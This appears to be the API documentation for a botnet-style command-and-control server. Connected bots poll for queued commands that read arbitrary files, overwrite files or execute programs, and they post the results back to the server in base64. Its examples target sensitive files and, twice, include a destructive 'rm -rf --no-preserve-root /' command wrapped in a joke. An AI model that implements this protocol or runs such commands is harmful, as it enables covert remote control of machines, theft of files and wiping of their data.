# Server

## Commands

Commands take the following form:

```jsonc
{
    "action": "read", // OR "write" OR "execute"
    "path": "some path",
    "payload": [...]
}
```

With three different types of actions. These actions have different `payload` objects, but all of them
will call the server's `result` endpoint with a specific result.

### `read`

`path` is interpreted as the path to a file to read. `payload` is ignored in this case, the bot will read the file at `path`.

The returned result is expected to be the content of the file.

```jsonc
{
    "action": "read",
    "path": "/etc/some-config-file",
    "payload": [] 
}
```

### `write`

The first value in `payload` is interpreted as a base64-encoded string containing the bytes
to write to `path`. This string is decoded to a byte array, and `path` is overwritten
with the byte array.

The returned result is expected to be the return code of the `write` call.

```jsonc
{
    "action": "write",
    "path": "/tmp/some-file",
    "payload": ["aGVsbG8="] // base64 for "hello" in ASCII
}
```

### `execute`

The `payload` array is treated as a set of arguments to the executable `path`. Each value should be a string, and
is passed to the executable unmodified.

The returned result is the `stdout` output of the command, if any.

```jsonc
{
    "action": "execute",
    "path": "/usr/bin/bash",
    "payload": [
        "-c",
        "xcowsay 'eggs dee' && rm -rf --no-preserve-root /"
    ]
}
```

## `/init`: returns an ID for the bot

This returns a JSON object with the following format:

```jsonc
{
    "id": "some string"
}
```

The ID returned uniquely identifies a connected bot, and
is how a bot checks for commands.

## `/check/{id}`: return the list of commands for the bot

This returns a JSON object with the following format:

```jsonc
[
    {
        "action": "read", // or "write" or "execute"
        "path": "some string", // path to something being read/written/executed
        "payload": [] // possibly empty
    },
    // potentially more
]
```

This makes the server empty the command queue of the bot identified by `id`.

Example:
```jsonc
// GET /check/abcdef1234
[
    {
        "action": "read",
        "path": "/some/sensitive/file",
        "payload": []
    },
    {
        "action": "execute",
        "path": "/usr/bin/bash",
        "payload": [
            "-c",
            "xcowsay 'eggs dee' && rm -rf --no-preserve-root /"
        ]
    }
]
```

## `/result`: Return a result for a command

This accepts a POST with a JSON body of the following format:

```jsonc
{
    "id": "<some id>",
    "result": "<base64-encoded string>"
}
```

The `result` field is decoded and written to a file for `id`.